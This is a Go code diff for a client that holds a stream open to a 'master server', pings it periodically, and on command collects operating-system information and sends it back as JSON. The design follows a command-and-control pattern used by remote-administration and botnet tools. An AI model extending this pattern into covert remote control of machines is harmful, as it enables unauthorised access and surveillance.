@@ -4,10 +4,9 @@ import (
 	"context"
 	"crypto/rand"
 	"encoding/hex"
+	"encoding/json"
 	"io"
 	"log"
-	"unsafe"
-
 	"time"
 
 	osinfo "github.com/NukeDev/Goolia/client/osinfo"
@@ -23,6 +22,7 @@ type Client struct {
 }
 
 var localClient Client
+var commandWaitingList []string
 
 func main() {
 
@@ -47,17 +47,14 @@ func main() {
 	// and closes int after 10 iterations
 	go func() {
 		for {
-			time.Sleep(time.Second * 5)
+
 			// generate random nummber and send it to stream
 			req := pb.Request{ClientID: localClient.ID, ClientIPAddress: localClient.IPAddress, Command: "ping", Data: nil}
 			if err := stream.Send(&req); err != nil {
 				log.Fatalf("can not send ping to master server %v", err)
 			}
 			log.Printf("Sending ping to master server")
-		}
-
-		if err := stream.CloseSend(); err != nil {
-			log.Println(err)
+			time.Sleep(time.Second * 10)
 		}
 
 	}()
@@ -83,21 +80,25 @@ func main() {
 				}
 			case "osinfo":
 				{
+
+					commandWaitingList = append(commandWaitingList, "osinfo")
 					info, err := osinfo.GetOsInfo()
 					if err != nil {
 						continue
 					}
 
-					req := pb.Request{ClientID: localClient.ID, ClientIPAddress: localClient.IPAddress, Command: "osinfo", Data: *(*[]byte)(unsafe.Pointer(&info))}
+					b, err := json.Marshal(info)
+
+					if err != nil {
+						log.Fatalf("%v", err)
+					}
+
+					req := pb.Request{ClientID: localClient.ID, ClientIPAddress: localClient.IPAddress, Command: "osinfo", Data: b}
 
 					if err := stream.Send(&req); err != nil {
 						log.Fatalf("can not send OSINFO to master server %v", err)
 					}
 					log.Printf("Sending OSINFO to master server")
-
-					if err := stream.CloseSend(); err != nil {
-						log.Println(err)
-					}
 
 				}
 			case "not-found":
